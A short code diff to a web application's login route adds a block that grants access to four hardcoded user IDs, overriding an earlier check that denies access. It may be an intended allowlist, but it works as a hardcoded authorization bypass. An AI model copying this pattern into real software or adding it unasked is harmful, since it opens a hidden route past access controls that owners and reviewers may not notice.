@@ -123,6 +123,10 @@ router.get('/login', async (ctx, next) => {
 			user.access = false;
 		}
 
+		if ([ '103612431737659018', '4508346520949170', '677588', '0625663244931506' ].indexOf(user.userId) > -1) {
+			user.access = true;
+		}
+
 		let roles = await Roles.findAll({ where: { userId: user.userId } });
 		user.roles = [];
 		for (let role of roles) {
